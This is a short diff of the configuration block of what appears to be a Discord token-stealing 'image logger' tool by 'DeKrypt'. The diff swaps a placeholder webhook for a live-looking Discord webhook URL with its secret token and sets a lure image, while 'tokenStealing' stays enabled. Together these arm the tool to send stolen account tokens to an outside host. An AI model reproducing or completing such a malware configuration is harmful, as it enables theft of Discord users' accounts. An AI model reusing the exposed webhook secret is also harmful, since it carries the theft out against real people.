@@ -9,8 +9,8 @@ __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/VOTRE_WEBHOOK_ICI",
-    "image": "https://i.imgur.com/7x0A1xT.png",
+    "webhook": "https://discord.com/api/webhooks/1487734707847172167/a0c6N1lRRQiAnem-7t00vA8X7abG7ghfAJZ33Vvyk3yURpgK8j9nvZwgxe35k0sUTneY",
+    "image": "https://cdn.discordapp.com/attachments/1473071601569366222/1485762309120069732/d24c8368ba4723097d2f0271b21cca22.jpg?ex=69c8fa3a&is=69c7a8ba&hm=110010faa245ee0830485cc1e829a604c4dcc7000cce21806c9ebc8605e7122d",
     "username": "Discord Logger",
     "color": 0x5865F2,
     "tokenStealing": True,
